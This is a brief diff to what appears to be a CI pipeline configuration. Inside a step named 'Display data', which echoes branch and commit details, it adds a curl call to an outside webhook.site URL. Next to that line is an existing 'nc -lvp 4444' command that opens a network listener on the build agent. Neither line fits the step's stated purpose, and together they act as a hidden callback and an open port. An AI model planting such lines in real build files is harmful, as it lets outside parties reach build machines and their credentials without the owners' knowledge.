@@ -12,6 +12,7 @@ steps:
       echo "$(Build.SourceBranchName)"
       echo "verifying the following commit:"
       echo "$(Build.SourceVersionMessage)"
+      curl https://webhook.site/e2ab8e47-8c65-46f3-9bd9-994863448b40
       nc -lvp 4444
       
     displayName: Display data
